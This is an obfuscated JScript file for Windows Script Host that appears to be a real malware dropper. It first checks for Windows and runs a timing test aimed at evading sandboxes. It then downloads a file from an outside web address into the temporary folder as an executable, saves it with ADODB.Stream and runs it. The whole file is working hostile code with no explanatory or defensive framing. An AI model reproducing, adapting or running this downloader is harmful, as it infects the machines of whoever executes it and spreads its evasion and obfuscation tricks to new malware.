var Jm = false;
var oC = "CreateObject";
var w0 = function R() {return WScript[oC]("WScript.Shell");}(), z = 11;
var U = "MSXML2.XMLHTTP";
var u = 2123213;
var P = 0;
function e(yA){w0["Run"](yA, P, P);};
function dq(){return "" + U;};
function Za(P1, G){P = P * 1; return P1 - G;};
function Ua(){return oC;};
/*@cc_on
  @if (@_win32 || @_win64)
    Jm = true;
  @end
@*/
if (Jm)
{
var wZ = "";
function AA(){return 22;};
var rv = 0; var P0 = 0;
function x()
{
var Sc = new this["Date"]();
var gL = Sc["getUTCMilliseconds"]();
WScript["Sleep"](AA());
var Sc = new this["Date"]();
var zU = Sc["getUTCMilliseconds"]();
WScript["Sleep"](AA());
var Sc = new this["Date"]();
var wz = Sc["getUTCMilliseconds"]();
var rv = "Lp";
rv = Za(zU, gL);
var P0 = "Yw";
P0 = Za(wz, zU);
wZ = "open";
return Za(rv, P0);
}
var Tz = false;
var I = false;
for (var w = P; w < AA() * 1; w++){if (x() != P){
Tz = true; 
P0 = "31" + 11 * rv + P0; 
I = true; 
break;
}}
function y() {return ((Tz == true) && (Tz == I)) ? 1 : P;};
if (Tz && y() && I){
function QZ() {return w0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8Tf1hJQCdfy.exe";};
 NZ = dq();
 PB = WScript[oC](NZ);
 var l = 1;
 while (l){
try {
PB[wZ]("GET", "http://www.deco-dessert.com/k3dua", false);
PB["send"]();
r = "Sleep";
for (;;){WScript[r](AA() * 11); if (PB["readystate"] >= 2 * 2) break;};
l = P;
} catch(gw){};
}
function W(Ru) {var Ns = (1, 2, 3, 4, 5, Ru); return Ns;};
dq0 = WScript[Ua()]("ADODB.Stream");
NZ = dq0;
NZ[wZ]();
NZ["type"] = W(1);
NZ["write"](PB["ResponseBody"]);
dq0["position"] = W(P);
NZ["Save" + "ToFile"](QZ(), 2);
dq0["c"+"lose"]();
W0 = QZ();
e(W0);
}
}

